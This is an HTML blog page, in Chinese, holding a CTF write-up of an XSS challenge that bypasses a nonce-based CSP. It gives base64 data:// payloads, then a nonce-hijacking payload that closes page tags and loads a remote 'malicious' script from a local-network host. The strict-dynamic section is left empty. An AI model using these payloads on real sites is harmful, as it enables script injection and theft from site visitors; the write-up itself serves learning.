@@ -1,0 +1,351 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head><meta name="generator" content="Hexo 3.8.0">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="之前CTF做的一道需要绕过CSP的XSS题目，具体的代码没记下来，这里写个类似的来复现。 题目分析访问目标站点，如下图所示，看到提示输入URL：  啥也不输入，点击Go，发现URL栏多了name参数和url参数：   查看源码，发现查看不到页面上显示的“Mi1k7ea”，推测应该是动态插入DOM生成的吧，右键查看元素，看到如下结构：  其中在header头和最后各包含一段JS代码，其中的scrip">
+<meta name="keywords" content="XSS,Web安全">
+<meta property="og:type" content="article">
+<meta property="og:title" content="一道绕过CSP的XSS题目">
+<meta property="og:url" content="https://Mi1k7ea.github.com/2019/02/21/一道绕过CSP的XSS题目/index.html">
+<meta property="og:site_name" content="Mi1k7ea">
+<meta property="og:description" content="之前CTF做的一道需要绕过CSP的XSS题目，具体的代码没记下来，这里写个类似的来复现。 题目分析访问目标站点，如下图所示，看到提示输入URL：  啥也不输入，点击Go，发现URL栏多了name参数和url参数：   查看源码，发现查看不到页面上显示的“Mi1k7ea”，推测应该是动态插入DOM生成的吧，右键查看元素，看到如下结构：  其中在header头和最后各包含一段JS代码，其中的scrip">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/02/21/一道绕过CSP的XSS题目/1.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/02/21/一道绕过CSP的XSS题目/2.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/02/21/一道绕过CSP的XSS题目/3.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/02/21/一道绕过CSP的XSS题目/4.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/02/21/一道绕过CSP的XSS题目/5.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/02/21/一道绕过CSP的XSS题目/6.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/02/21/一道绕过CSP的XSS题目/7.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/02/21/一道绕过CSP的XSS题目/8.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/02/21/一道绕过CSP的XSS题目/9.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/02/21/一道绕过CSP的XSS题目/10.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/02/21/一道绕过CSP的XSS题目/11.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/02/21/一道绕过CSP的XSS题目/12.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/02/21/一道绕过CSP的XSS题目/13.png">
+<meta property="og:updated_time" content="2019-02-22T14:46:54.871Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="一道绕过CSP的XSS题目">
+<meta name="twitter:description" content="之前CTF做的一道需要绕过CSP的XSS题目，具体的代码没记下来，这里写个类似的来复现。 题目分析访问目标站点，如下图所示，看到提示输入URL：  啥也不输入，点击Go，发现URL栏多了name参数和url参数：   查看源码，发现查看不到页面上显示的“Mi1k7ea”，推测应该是动态插入DOM生成的吧，右键查看元素，看到如下结构：  其中在header头和最后各包含一段JS代码，其中的scrip">
+<meta name="twitter:image" content="https://mi1k7ea.github.com/2019/02/21/一道绕过CSP的XSS题目/1.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>一道绕过CSP的XSS题目</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">寒舍</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/categories/">目录</a></li>
+         
+          <li><a href="/tags/">标签</a></li>
+         
+          <li><a href="/about/">吾者</a></li>
+         
+          <li><a href="https://blog.csdn.net/ski_12/">朝花夕拾</a></li>
+         
+          <li><a href="/atom.xml">RSS</a></li>
+        
+      </ul>
+    </span>
+    <br>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2019/02/19/一些加载XSS-Payload的标签/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://Mi1k7ea.github.com/2019/02/21/一道绕过CSP的XSS题目/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://Mi1k7ea.github.com/2019/02/21/一道绕过CSP的XSS题目/&text=一道绕过CSP的XSS题目"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://Mi1k7ea.github.com/2019/02/21/一道绕过CSP的XSS题目/&title=一道绕过CSP的XSS题目"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://Mi1k7ea.github.com/2019/02/21/一道绕过CSP的XSS题目/&is_video=false&description=一道绕过CSP的XSS题目"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=一道绕过CSP的XSS题目&body=Check out this article: https://Mi1k7ea.github.com/2019/02/21/一道绕过CSP的XSS题目/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://Mi1k7ea.github.com/2019/02/21/一道绕过CSP的XSS题目/&title=一道绕过CSP的XSS题目"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://Mi1k7ea.github.com/2019/02/21/一道绕过CSP的XSS题目/&title=一道绕过CSP的XSS题目"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://Mi1k7ea.github.com/2019/02/21/一道绕过CSP的XSS题目/&title=一道绕过CSP的XSS题目"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://Mi1k7ea.github.com/2019/02/21/一道绕过CSP的XSS题目/&title=一道绕过CSP的XSS题目"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://Mi1k7ea.github.com/2019/02/21/一道绕过CSP的XSS题目/&name=一道绕过CSP的XSS题目&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#题目分析"><span class="toc-number">1.</span> <span class="toc-text">题目分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS-payload注入"><span class="toc-number">2.</span> <span class="toc-text">XSS payload注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSP绕过"><span class="toc-number">3.</span> <span class="toc-text">CSP绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#利用浏览器补全功能绕过"><span class="toc-number">3.1.</span> <span class="toc-text">利用浏览器补全功能绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用strict-dynamic结合gadget绕过"><span class="toc-number">3.2.</span> <span class="toc-text">利用strict-dynamic结合gadget绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#模仿写的源码"><span class="toc-number">4.</span> <span class="toc-text">模仿写的源码</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        一道绕过CSP的XSS题目
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+        <span itemprop="name">Mi1k7ea</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2019-02-21T14:12:05.000Z" itemprop="datePublished">2019-02-21</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/WriteUp-Web/">WriteUp:Web</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/Web安全/">Web安全</a>, <a class="tag-link" href="/tags/XSS/">XSS</a>
+    </div>
+    <div class="article-tag">
+        <i class="fas fa-eye"></i>
+        阅读量：<span id="busuanzi_value_page_pv"></span>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>之前CTF做的一道需要绕过CSP的XSS题目，具体的代码没记下来，这里写个类似的来复现。</p>
+<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>访问目标站点，如下图所示，看到提示输入URL：</p>
+<p><img src="/2019/02/21/一道绕过CSP的XSS题目/1.png" alt=""></p>
+<p>啥也不输入，点击Go，发现URL栏多了name参数和url参数：</p>
+<p> <img src="/2019/02/21/一道绕过CSP的XSS题目/2.png" alt=""></p>
+<p>查看源码，发现查看不到页面上显示的“Mi1k7ea”，推测应该是动态插入DOM生成的吧，右键查看元素，看到如下结构：</p>
+<p><img src="/2019/02/21/一道绕过CSP的XSS题目/3.png" alt=""></p>
+<p>其中在header头和最后各包含一段JS代码，其中的script标签都含有nonce属性，推测应该是采用了CSP策略，多次访问nonce属性值都不一样，即是随机生成的。中间是URL栏中name参数的插入点，插入到id为”yourname”的a标签中显示到页面中。</p>
+<p>这里可以看到，header头的JS代码是对DOM的动态操作，$(document).read即页面加载完执行；最后的JS代码为处理URL和创建Node，然后被前面的JS动态插入DOM节点中。</p>
+<p>既然涉及到了CSP，抓包看看它设置的策略吧：</p>
+<p><img src="/2019/02/21/一道绕过CSP的XSS题目/4.png" alt=""></p>
+<p>其CSP设置如下：</p>
+<p>Content-Security-Policy: default-src ‘none’; script-src ‘nonce-96a80ac6288a465630f4e631bf2f192e’ ‘strict-dynamic’; base-uri ‘self’; style-src ‘self’; font-src ‘self’</p>
+<p>关键点应该是前两个，即default-src ‘none’;和script-src ‘nonce-xx’ ‘strict-dynamic’;</p>
+<p>因为前面header头的JS是动态添加DOM节点的，推测应该和strict-dynamic这个相关，可参考<a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf" target="_blank" rel="noopener">black hat 2017关于script gadgets绕过CSP</a>。</p>
+<h2 id="XSS-payload注入"><a href="#XSS-payload注入" class="headerlink" title="XSS payload注入"></a>XSS payload注入</h2><p>从前面的题目分析可知，页面的输入点有两处，即GET方式的name参数和url参数。</p>
+<p>其中name参数是输入到id为”yourname”的a标签中，尝试对其进行XSS测试，发现会直接返回输入的内容，即已经实体编码了，利用点应该不在这：</p>
+<p><img src="/2019/02/21/一道绕过CSP的XSS题目/5.png" alt=""></p>
+<p>另一个参数url，可通过input栏输入提交，尝试输入标签内容，发现提示输入内容为非法URL：</p>
+<p><img src="/2019/02/21/一道绕过CSP的XSS题目/6.png" alt=""></p>
+<p>那就输入一个外部URL地址如<a href="http://www.mi1k7ea.com" target="_blank" rel="noopener">本博客</a>，发现提示只能输入服务端本身的URL，即应该限定了只能输入访问本地的URL，并且限制了只能是协议://ip:port这种形式才能正常执行：</p>
+<p><img src="/2019/02/21/一道绕过CSP的XSS题目/7.png" alt=""></p>
+<p>那么问题来了，限制了只能通过协议://ip:port这种形式来作为开头输入，并且限定只能是服务端的IP，那不就没法注入XSS payload了？</p>
+<p>当时卡在这里卡了很久，后面发现，这是PHP的题目，是不是可以利用PHP伪协议？要想输入的内容能显现在页面中，能与之相关联的伪协议即data://伪协议。</p>
+<p>测试一下，在输入框输入：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data://127.0.0.1/;base64,PGltZz4=</span><br><span class="line">其中PGltZz4=为&lt;img&gt;的base64编码结果</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/02/21/一道绕过CSP的XSS题目/8.png" alt=""></p>
+<p>检查元素可以看到，img标签成功插入到页面中显示出来。</p>
+<p>接下来直接插入script标签尝试弹框：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data://127.0.0.1/;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==</span><br><span class="line">PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==为&lt;script&gt;alert(1)&lt;/script&gt;的base64编码结果</span><br></pre></td></tr></table></figure>
+<p>发现标签是插进去了，但是没有弹框，意料之中，我们的script标签没有nonce值，被CSP策略拦截不可执行了：</p>
+<p><img src="/2019/02/21/一道绕过CSP的XSS题目/9.png" alt=""></p>
+<h2 id="CSP绕过"><a href="#CSP绕过" class="headerlink" title="CSP绕过"></a>CSP绕过</h2><p>关于CSP绕过，这里主要有两种方式。主要参考自<a href="https://www.jianshu.com/p/f1de775bc43e" target="_blank" rel="noopener">CSP策略及绕过方法</a>。</p>
+<h3 id="利用浏览器补全功能绕过"><a href="#利用浏览器补全功能绕过" class="headerlink" title="利用浏览器补全功能绕过"></a>利用浏览器补全功能绕过</h3><p>由前面知道，我们的script标签由于没有nonce，而CSP中设置的其中一条 script-src ‘nonce-xx’ ‘strict-dynamic’; 限定了有随机nonce值或由有nonce的标签动态生成的script才能执行。</p>
+<p>这里关注前面的script-src ‘nonce-xx’，我们想一下，是不是可以劫持某个script标签的nonce属性呢？</p>
+<p>在参考的文章中说到：</p>
+<p><img src="/2019/02/21/一道绕过CSP的XSS题目/10.png" alt=""></p>
+<p>也就是说，利用浏览器补全的功能，在含有nonce的script标签前面的插入点插入script标签的同时，插入a=”以闭合后面script标签的第一个属性的双引号，从而使中间的内容失效，将本来的nonce属性劫持到了插入的script标签中，使得该插入标签可以正常执行JS代码。</p>
+<p>我们回过头来看看页面代码布局，可以看到在插入的标签后面在一段拥有nonce属性的script标签，就是它了：</p>
+<p><img src="/2019/02/21/一道绕过CSP的XSS题目/11.png" alt=""></p>
+<p>构造payload：我们需要先闭合掉前面的pre和form标签，然后再插入script标签；在script标签中，先写入包含远程恶意js代码文件的src属性，再添加a=”。即</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">将 &lt;/pre&gt;&lt;/form&gt;&lt;script src=&quot;http://192.168.248.1/a.js&quot; a=&quot;  Base64加密即可</span><br><span class="line">data://127.0.0.1/;base64,PC9wcmU+PC9mb3JtPjxzY3JpcHQgc3JjPSJodHRwOi8vMTkyLjE2OC4yNDguMS9hLmpzIiBhPSI=</span><br></pre></td></tr></table></figure>
+<p>直接输入payload访问：</p>
+<p><img src="/2019/02/21/一道绕过CSP的XSS题目/12.png" alt=""></p>
+<p>成功弹框，没有问题。</p>
+<p>再看一下页面元素：</p>
+<p><img src="/2019/02/21/一道绕过CSP的XSS题目/13.png" alt=""></p>
+<p>这里再解释一遍，把pre和form标签闭合之后，输入<code>&lt;script src=xxx a=&quot;</code>的内容，由于浏览器的补全功能，a标签的双引号会和最后的script标签的第一个元素即type的双引号闭合掉，从而使中间的内容即第一个红框内的内容无效，导致后面的内容自己成为新的属性，包括nonce属性，从而成功劫持了最后的script标签的nonce属性为插入的script属性，最终成功执行。</p>
+<p>但是上述的a标签在Chrome上是执行不了的，原因在于Chrome中a属性中的<code>&lt;script</code>会被认为是一个标签而不是字符，因而前面双引号闭合的时候没法正常使其失效。但是这里可以使用src属性替代，使其可在Chrome下正常执行。</p>
+<h3 id="利用strict-dynamic结合gadget绕过"><a href="#利用strict-dynamic结合gadget绕过" class="headerlink" title="利用strict-dynamic结合gadget绕过"></a>利用strict-dynamic结合gadget绕过</h3><h2 id="模仿写的源码"><a href="#模仿写的源码" class="headerlink" title="模仿写的源码"></a>模仿写的源码</h2>
+  </div>
+</article>
+
+
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<br><br>
+<div id="vcomments"></div>
+    <script>
+        new Valine({
+            av: AV,
+            el: '#vcomments',
+            appId: 'Jyl0XQwm2jIH31Tx16dygCNv-gzGzoHsz',
+            appKey: 'Iqq1VTg9X5EfKJt3MMIj8MMB',
+            placeholder: '大佬亲临寒站，可否指点一二',
+        })
+    </script>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">寒舍</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/categories/">目录</a></li>
+         
+          <li><a href="/tags/">标签</a></li>
+         
+          <li><a href="/about/">吾者</a></li>
+         
+          <li><a href="https://blog.csdn.net/ski_12/">朝花夕拾</a></li>
+         
+          <li><a href="/atom.xml">RSS</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#题目分析"><span class="toc-number">1.</span> <span class="toc-text">题目分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS-payload注入"><span class="toc-number">2.</span> <span class="toc-text">XSS payload注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSP绕过"><span class="toc-number">3.</span> <span class="toc-text">CSP绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#利用浏览器补全功能绕过"><span class="toc-number">3.1.</span> <span class="toc-text">利用浏览器补全功能绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用strict-dynamic结合gadget绕过"><span class="toc-number">3.2.</span> <span class="toc-text">利用strict-dynamic结合gadget绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#模仿写的源码"><span class="toc-number">4.</span> <span class="toc-text">模仿写的源码</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://Mi1k7ea.github.com/2019/02/21/一道绕过CSP的XSS题目/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://Mi1k7ea.github.com/2019/02/21/一道绕过CSP的XSS题目/&text=一道绕过CSP的XSS题目"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://Mi1k7ea.github.com/2019/02/21/一道绕过CSP的XSS题目/&title=一道绕过CSP的XSS题目"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://Mi1k7ea.github.com/2019/02/21/一道绕过CSP的XSS题目/&is_video=false&description=一道绕过CSP的XSS题目"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=一道绕过CSP的XSS题目&body=Check out this article: https://Mi1k7ea.github.com/2019/02/21/一道绕过CSP的XSS题目/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://Mi1k7ea.github.com/2019/02/21/一道绕过CSP的XSS题目/&title=一道绕过CSP的XSS题目"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://Mi1k7ea.github.com/2019/02/21/一道绕过CSP的XSS题目/&title=一道绕过CSP的XSS题目"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://Mi1k7ea.github.com/2019/02/21/一道绕过CSP的XSS题目/&title=一道绕过CSP的XSS题目"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://Mi1k7ea.github.com/2019/02/21/一道绕过CSP的XSS题目/&title=一道绕过CSP的XSS题目"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://Mi1k7ea.github.com/2019/02/21/一道绕过CSP的XSS题目/&name=一道绕过CSP的XSS题目&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="false"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="false"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="false"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="false"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2019 Mi1k7ea
+  </div>
+  <span id="busuanzi_container_site_pv"> 
+    <i class="fas fa-eye"></i>
+    过客：<span id="busuanzi_value_site_uv"></span>
+  </span>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">寒舍</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/categories/">目录</a></li>
+         
+          <li><a href="/tags/">标签</a></li>
+         
+          <li><a href="/about/">吾者</a></li>
+         
+          <li><a href="https://blog.csdn.net/ski_12/">朝花夕拾</a></li>
+         
+          <li><a href="/atom.xml">RSS</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+<script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    </div>
+    <!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+    <!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
